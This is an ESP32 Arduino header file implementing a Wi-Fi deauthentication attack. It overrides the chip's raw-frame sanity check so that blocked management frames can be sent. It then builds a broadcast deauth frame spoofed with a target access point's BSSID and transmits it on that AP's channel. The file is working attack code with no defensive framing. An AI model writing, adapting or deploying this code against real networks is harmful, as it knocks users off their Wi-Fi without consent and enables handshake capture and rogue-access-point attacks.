#ifndef DEAUTH_H
#define DEAUTH_H

#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_system.h"

// Define deauth frame variables
static uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};
uint8_t deauth_frame[sizeof(deauth_frame_default)];

// Weak declaration to override the original function
extern "C" int __attribute__((weak)) ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3);

// Our implementation
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) return 1;
    return 0;
}

// Send raw frame
void wsl_bypasser_send_raw_frame(const uint8_t* frame_buffer, int size) {
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
}

// Send deauth frame
void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t* ap_record, uint8_t chan) {
    Serial.print("Preparing deauth frame to -> ");
    for (int j = 0; j < 6; j++) {
        Serial.print(ap_record->bssid[j], HEX);
        if (j < 5) Serial.print(":");
    }

    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    delay(50);

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);

    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}

#endif